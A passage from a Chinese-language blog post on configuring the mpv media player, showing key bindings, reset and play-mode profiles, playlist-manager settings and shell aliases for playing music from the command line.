<span><span style="color: #403f53">Ctrl+WHEEL_DOWN script-message cursor-centric-zoom -0.1</span></span>
<span><span style="color: #403f53">Ctrl+MBTN_LEFT  script-binding drag-to-pan</span></span>
<span><span style="color: #403f53">r               script-message rotate-video  90</span></span>
<span><span style="color: #403f53">R               script-message rotate-video -90</span></span></samp></pre></div></section>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-57"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-57--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">no-window-dragging </span><span style="color: #637777"># for drag-to-pan</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">no-window-dragging </span><span style="color: #989FB1"># for drag-to-pan</span></span></code></pre></div></section>
<h3 id="选择-track" class="heading"><a href="#选择-track" class="heading-anchor" aria-label="章节： 选择 track" tabindex="-1"></a><span>选择 track</span></h3>
<p>裸的 mpv 添加 / 选择 track 很不方便<span class="mojikumi-line-end">，</span>有了 <code>mpvcontextmenu</code> 就好很多了<span class="mojikumi-line-end">，</span>但我在发现它之前就自己写了两个脚本<span class="mojikumi-line-end">，</span>现在有了它就把添加文件的删了<span class="mojikumi-line-end">，</span>但选择 track 还是保留下来<span class="mojikumi-line-end">。</span></p>
<p>顺便还会在打开文件时检测当前是否是双声道<span class="mojikumi-line-end">，</span>如果不是<span class="mojikumi-line-start">（</span>例如是环绕声<span class="mojikumi-line-end">）</span>则弹出音轨选择<span class="mojikumi-line-end">。</span></p>
<p><a href="https://github.com/ouuan/dotfiles/blob/master/.config/mpv/scripts/select-track.lua"><code>select<wbr>-<wbr>track<wbr>.<wbr>lua</code></a></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-58"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-58--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">t               script-binding select-subtitle</span></span>
<span><span style="color: #d6deeb">T               script-binding select-audio</span></span>
<span><span style="color: #d6deeb">Ctrl+t          script-binding select-video</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">t               script-binding select-subtitle</span></span>
<span><span style="color: #403f53">T               script-binding select-audio</span></span>
<span><span style="color: #403f53">Ctrl+t          script-binding select-video</span></span></samp></pre></div></section>
<h3 id="重置设置" class="heading"><a href="#重置设置" class="heading-anchor" aria-label="章节： 重置设置" tabindex="-1"></a><span>重置设置</span></h3>
<p>我这里只重置了会被我的 key binding 修改的设置<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-59"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-59--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">Ctrl+0          apply-profile reset-all ; show-text 已重置所有设置</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">Ctrl+0          apply-profile reset-all ; show-text 已重置所有设置</span></span></samp></pre></div></section>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-60"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-60--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">[reset-all]</span></span>
<span><span style="color: #C792EA">profile-desc</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">重置所有设置</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">volume</span><span style="color: #D6DEEB">=100</span></span>
<span><span style="color: #C792EA">mute</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #C792EA">speed</span><span style="color: #D6DEEB">=1</span></span>
<span><span style="color: #C792EA">brightness</span><span style="color: #D6DEEB">=0</span></span>
<span><span style="color: #C792EA">video-zoom</span><span style="color: #D6DEEB">=0</span></span>
<span><span style="color: #C792EA">video-pan-x</span><span style="color: #D6DEEB">=0</span></span>
<span><span style="color: #C792EA">video-pan-y</span><span style="color: #D6DEEB">=0</span></span>
<span><span style="color: #C792EA">video-rotate</span><span style="color: #D6DEEB">=0</span></span>
<span><span style="color: #C792EA">sub-visibility</span><span style="color: #D6DEEB">=yes</span></span>
<span><span style="color: #C792EA">sub-scale</span><span style="color: #D6DEEB">=1</span></span>
<span><span style="color: #C792EA">sub-pos</span><span style="color: #D6DEEB">=100</span></span>
<span><span style="color: #C792EA">audio-delay</span><span style="color: #D6DEEB">=0</span></span>
<span><span style="color: #C792EA">ab-loop-a</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #C792EA">ab-loop-b</span><span style="color: #D6DEEB">=no</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">[reset-all]</span></span>
<span><span style="color: #994CC3">profile-desc</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">重置所有设置</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">volume</span><span style="color: #403F53">=100</span></span>
<span><span style="color: #994CC3">mute</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #994CC3">speed</span><span style="color: #403F53">=1</span></span>
<span><span style="color: #994CC3">brightness</span><span style="color: #403F53">=0</span></span>
<span><span style="color: #994CC3">video-zoom</span><span style="color: #403F53">=0</span></span>
<span><span style="color: #994CC3">video-pan-x</span><span style="color: #403F53">=0</span></span>
<span><span style="color: #994CC3">video-pan-y</span><span style="color: #403F53">=0</span></span>
<span><span style="color: #994CC3">video-rotate</span><span style="color: #403F53">=0</span></span>
<span><span style="color: #994CC3">sub-visibility</span><span style="color: #403F53">=yes</span></span>
<span><span style="color: #994CC3">sub-scale</span><span style="color: #403F53">=1</span></span>
<span><span style="color: #994CC3">sub-pos</span><span style="color: #403F53">=100</span></span>
<span><span style="color: #994CC3">audio-delay</span><span style="color: #403F53">=0</span></span>
<span><span style="color: #994CC3">ab-loop-a</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #994CC3">ab-loop-b</span><span style="color: #403F53">=no</span></span></code></pre></div></section>
<h2 id="听歌" class="heading"><a href="#听歌" class="heading-anchor" aria-label="章节： 听歌" tabindex="-1"></a><span>听歌</span></h2>
<h3 id="播放列表管理" class="heading"><a href="#播放列表管理" class="heading-anchor" aria-label="章节： 播放列表管理" tabindex="-1"></a><span>播放列表管理</span></h3>
<p><a href="https://github.com/jonniek/mpv-playlistmanager">jonniek/mpv-playlistmanager: Mpv lua script to create and manage playlists</a></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-61"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-61--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">P               script-binding showplaylist</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">P               script-binding showplaylist</span></span></samp></pre></div></section>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-62"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-62--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">key_moveup</span><span style="color: #D6DEEB">=k UP</span></span>
<span><span style="color: #C792EA">key_movedown</span><span style="color: #D6DEEB">=j DOWN</span></span>
<span><span style="color: #C792EA">key_movepageup</span><span style="color: #D6DEEB">=Ctrl+u PGUP</span></span>
<span><span style="color: #C792EA">key_movepagedown</span><span style="color: #D6DEEB">=Ctrl+d PGDWN</span></span>
<span><span style="color: #C792EA">key_movebegin</span><span style="color: #D6DEEB">=^ 0 HOME</span></span>
<span><span style="color: #C792EA">key_moveend</span><span style="color: #D6DEEB">=$ END</span></span>
<span><span style="color: #C792EA">key_selectfile</span><span style="color: #D6DEEB">=d-d</span></span>
<span><span style="color: #C792EA">key_unselectfile</span><span style="color: #D6DEEB">=p</span></span>
<span><span style="color: #C792EA">key_playfile</span><span style="color: #D6DEEB">=l ENTER</span></span>
<span><span style="color: #C792EA">key_removefile</span><span style="color: #D6DEEB">=x BS</span></span>
<span><span style="color: #C792EA">key_closeplaylist</span><span style="color: #D6DEEB">=ESC P h</span></span>
<span></span>
<span><span style="color: #C792EA">showamount</span><span style="color: #D6DEEB">=20</span></span>
<span><span style="color: #C792EA">text_padding_y</span><span style="color: #D6DEEB">=15</span></span>
<span><span style="color: #C792EA">curtain_opacity</span><span style="color: #D6DEEB">=0.3</span></span>
<span><span style="color: #C792EA">style_ass_tags</span><span style="color: #D6DEEB">={\fs11}</span></span>
<span><span style="color: #C792EA">slice_longfilenames</span><span style="color: #D6DEEB">=yes</span></span>
<span><span style="color: #C792EA">slice_longfilenames_amount</span><span style="color: #D6DEEB">=120</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">key_moveup</span><span style="color: #403F53">=k UP</span></span>
<span><span style="color: #994CC3">key_movedown</span><span style="color: #403F53">=j DOWN</span></span>
<span><span style="color: #994CC3">key_movepageup</span><span style="color: #403F53">=Ctrl+u PGUP</span></span>
<span><span style="color: #994CC3">key_movepagedown</span><span style="color: #403F53">=Ctrl+d PGDWN</span></span>
<span><span style="color: #994CC3">key_movebegin</span><span style="color: #403F53">=^ 0 HOME</span></span>
<span><span style="color: #994CC3">key_moveend</span><span style="color: #403F53">=$ END</span></span>
<span><span style="color: #994CC3">key_selectfile</span><span style="color: #403F53">=d-d</span></span>
<span><span style="color: #994CC3">key_unselectfile</span><span style="color: #403F53">=p</span></span>
<span><span style="color: #994CC3">key_playfile</span><span style="color: #403F53">=l ENTER</span></span>
<span><span style="color: #994CC3">key_removefile</span><span style="color: #403F53">=x BS</span></span>
<span><span style="color: #994CC3">key_closeplaylist</span><span style="color: #403F53">=ESC P h</span></span>
<span></span>
<span><span style="color: #994CC3">showamount</span><span style="color: #403F53">=20</span></span>
<span><span style="color: #994CC3">text_padding_y</span><span style="color: #403F53">=15</span></span>
<span><span style="color: #994CC3">curtain_opacity</span><span style="color: #403F53">=0.3</span></span>
<span><span style="color: #994CC3">style_ass_tags</span><span style="color: #403F53">={\fs11}</span></span>
<span><span style="color: #994CC3">slice_longfilenames</span><span style="color: #403F53">=yes</span></span>
<span><span style="color: #994CC3">slice_longfilenames_amount</span><span style="color: #403F53">=120</span></span></code></pre></div></section>
<p><s>其他都还好<span class="mojikumi-line-end">，</span>这个 <code>dd</code> / <code>p</code> 确实太 Vim 了<span class="mojikumi-line-start">（</span></s></p>
<h3 id="播放模式" class="heading"><a href="#播放模式" class="heading-anchor" aria-label="章节： 播放模式" tabindex="-1"></a><span>播放模式</span></h3>
<p>我是觉得下面这几种播放模式比较常用<span class="mojikumi-line-start">（</span>列表循环不太常用<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>而看视频时一般播完暂停比较好<span class="mojikumi-line-end">，</span>作为默认<span class="mojikumi-line-end">。</span>随机播放/单曲循环的时候一般不需要保存播放进度<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-63"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-63--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">profile</span><span style="color: #D6DEEB">=playmode-pause</span></span>
<span></span>
<span><span style="color: #D6DEEB">[playmode-pause]</span></span>
<span><span style="color: #C792EA">profile-desc</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">播完暂停</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">keep-open</span><span style="color: #D6DEEB">=always</span></span>
<span><span style="color: #C792EA">loop-file</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #C792EA">loop-playlist</span><span style="color: #D6DEEB">=inf</span></span>
<span><span style="color: #C792EA">shuffle</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #D6DEEB">save-position-on-quit</span></span>
<span></span>
<span><span style="color: #D6DEEB">[playmode-shuffle]</span></span>
<span><span style="color: #C792EA">profile-desc</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">随机播放</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">keep-open</span><span style="color: #D6DEEB">=yes</span></span>
<span><span style="color: #C792EA">loop-file</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #C792EA">loop-playlist</span><span style="color: #D6DEEB">=inf</span></span>
<span><span style="color: #D6DEEB">shuffle</span></span>
<span><span style="color: #D6DEEB">no-save-position-on-quit</span></span>
<span></span>
<span><span style="color: #D6DEEB">[playmode-loopfile]</span></span>
<span><span style="color: #C792EA">profile-desc</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">单文件循环</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">keep-open</span><span style="color: #D6DEEB">=yes</span></span>
<span><span style="color: #C792EA">loop-file</span><span style="color: #D6DEEB">=inf</span></span>
<span><span style="color: #C792EA">loop-playlist</span><span style="color: #D6DEEB">=inf</span></span>
<span><span style="color: #C792EA">shuffle</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #D6DEEB">no-save-position-on-quit</span></span>
<span></span>
<span><span style="color: #D6DEEB">[playmode-playall]</span></span>
<span><span style="color: #C792EA">profile-desc</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">顺序播放</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">keep-open</span><span style="color: #D6DEEB">=yes</span></span>
<span><span style="color: #C792EA">loop-file</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #C792EA">loop-playlist</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #C792EA">shuffle</span><span style="color: #D6DEEB">=no</span></span>
<span><span style="color: #D6DEEB">save-position-on-quit</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">profile</span><span style="color: #403F53">=playmode-pause</span></span>
<span></span>
<span><span style="color: #403F53">[playmode-pause]</span></span>
<span><span style="color: #994CC3">profile-desc</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">播完暂停</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">keep-open</span><span style="color: #403F53">=always</span></span>
<span><span style="color: #994CC3">loop-file</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #994CC3">loop-playlist</span><span style="color: #403F53">=inf</span></span>
<span><span style="color: #994CC3">shuffle</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #403F53">save-position-on-quit</span></span>
<span></span>
<span><span style="color: #403F53">[playmode-shuffle]</span></span>
<span><span style="color: #994CC3">profile-desc</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">随机播放</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">keep-open</span><span style="color: #403F53">=yes</span></span>
<span><span style="color: #994CC3">loop-file</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #994CC3">loop-playlist</span><span style="color: #403F53">=inf</span></span>
<span><span style="color: #403F53">shuffle</span></span>
<span><span style="color: #403F53">no-save-position-on-quit</span></span>
<span></span>
<span><span style="color: #403F53">[playmode-loopfile]</span></span>
<span><span style="color: #994CC3">profile-desc</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">单文件循环</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">keep-open</span><span style="color: #403F53">=yes</span></span>
<span><span style="color: #994CC3">loop-file</span><span style="color: #403F53">=inf</span></span>
<span><span style="color: #994CC3">loop-playlist</span><span style="color: #403F53">=inf</span></span>
<span><span style="color: #994CC3">shuffle</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #403F53">no-save-position-on-quit</span></span>
<span></span>
<span><span style="color: #403F53">[playmode-playall]</span></span>
<span><span style="color: #994CC3">profile-desc</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">顺序播放</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">keep-open</span><span style="color: #403F53">=yes</span></span>
<span><span style="color: #994CC3">loop-file</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #994CC3">loop-playlist</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #994CC3">shuffle</span><span style="color: #403F53">=no</span></span>
<span><span style="color: #403F53">save-position-on-quit</span></span></code></pre></div></section>
<p>另外可以加一个 <code>no<wbr>-<wbr>keep<wbr>-<wbr>open<wbr>-<wbr>pause</code><span class="mojikumi-line-end">，</span>播完暂停时后退不会暂停<span class="mojikumi-line-end">。</span></p>
<p>快捷键切换<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-64"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-64--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">p               script-message cycle-commands &quot;apply-profile playmode-shuffle ; playlist-shuffle ; show-text 随机播放&quot; &quot;apply-profile playmode-loopfile ; playlist-unshuffle ; show-text 单曲循环&quot; &quot;apply-profile playmode-playall ; playlist-unshuffle ; show-text 顺序播放&quot; &quot;apply-profile playmode-pause ; playlist-unshuffle ; show-text 播完暂停&quot;</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">p               script-message cycle-commands &quot;apply-profile playmode-shuffle ; playlist-shuffle ; show-text 随机播放&quot; &quot;apply-profile playmode-loopfile ; playlist-unshuffle ; show-text 单曲循环&quot; &quot;apply-profile playmode-playall ; playlist-unshuffle ; show-text 顺序播放&quot; &quot;apply-profile playmode-pause ; playlist-unshuffle ; show-text 播完暂停&quot;</span></span></samp></pre></div></section>
<h3 id="playerctl" class="heading"><a href="#playerctl" class="heading-anchor" aria-label="章节： playerctl" tabindex="-1"></a><span>playerctl</span></h3>
<p>装了 <a href="https://github.com/hoyon/mpv-mpris">mpv-mpris</a> 就可以用 <a href="https://github.com/altdesktop/playerctl"><code>playerctl</code></a> 了<span class="mojikumi-line-end">。</span></p>
<p>关闭所有 mpv<span class="mojikumi">：</span><wbr><span class="mojikumi-line-start">（</span>当然 <code>killall</code> 也行就是比较暴力<span class="mojikumi-line-end">）</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Shell 代码块" data-v-ad49d235>Shell</h4><ile-root id="ile-65"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-65--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">alias</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">stopplay</span><span style="color: #C792EA">=</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">playerctl -a -p mpv stop</span><span style="color: #D9F5DD">&#39;</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">alias</span><span style="color: #403F53"> </span><span style="color: #4876D6">stopplay</span><span style="color: #994CC3">=</span><span style="color: #111111">&#39;</span><span style="color: #C96765">playerctl -a -p mpv stop</span><span style="color: #111111">&#39;</span></span></code></pre></div></section>
<p>用 i3 的话<span class="mojikumi-line-end">，</span>可以利用 playerctl 设快捷键<span class="mojikumi-line-end">，</span>用 <a href="https://bumblebee-status.readthedocs.io/en/main/modules.html#playerctl"><code>bumblebee<wbr>-<wbr>status</code> 的 <code>playerctl</code> module</a> 显示正在播放的媒体信息<span class="mojikumi-line-end">。</span></p>
<h3 id="从命令行播放音乐" class="heading"><a href="#从命令行播放音乐" class="heading-anchor" aria-label="章节： 从命令行播放音乐" tabindex="-1"></a><span>从命令行播放音乐</span></h3>
<p>我一般都是用若干 alias 来从命令行播放音乐<span class="mojikumi-line-start">（</span>所以很少在网易云上听<span class="mojikumi-line-start">（</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Shell 代码块" data-v-ad49d235>Shell</h4><ile-root id="ile-66"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-66--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #82AAFF">play</span><span style="color: #D6DEEB">() {</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">stopplay</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">&gt;</span><span style="color: #ECC48D">/dev/null</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">2&gt;&amp;1</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">bk</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">mpv</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">--profile=playmode-shuffle</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">--no-video</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">--no-resume-playback</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #D7DBE0">$@</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">alias</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">playjp</span><span style="color: #C792EA">=</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">play ~/Music/日本語の歌/</span><span style="color: #D9F5DD">&#39;</span></span>
<span><span style="color: #C5E478">...</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #4876D6">play</span><span style="color: #403F53">() {</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">stopplay</span><span style="color: #403F53"> </span><span style="color: #0C969B">&gt;</span><span style="color: #4876D6">/dev/null</span><span style="color: #403F53"> </span><span style="color: #0C969B">2&gt;&amp;1</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">bk</span><span style="color: #403F53"> </span><span style="color: #4876D6">mpv</span><span style="color: #403F53"> </span><span style="color: #4876D6">--profile=playmode-shuffle</span><span style="color: #403F53"> </span><span style="color: #4876D6">--no-video</span><span style="color: #403F53"> </span><span style="color: #4876D6">--no-resume-playback</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #403F53">$@</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">alias</span><span style="color: #403F53"> </span><span style="color: #4876D6">playjp</span><span style="color: #994CC3">=</span><span style="color: #111111">&#39;</span><span style="color: #C96765">play ~/Music/日本語の歌/</span><span style="color: #111111">&#39;</span></span>
<span><span style="color: #4876D6">...</span></span></code></pre></div></section>
<p>其中 <code>bk</code> 是一个我用了很多年的小 trick<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Shell 代码块" data-v-ad49d235>Shell</h4><ile-root id="ile-67"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-67--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #82AAFF">bk_noalias</span><span style="color: #D6DEEB">() {</span></span>
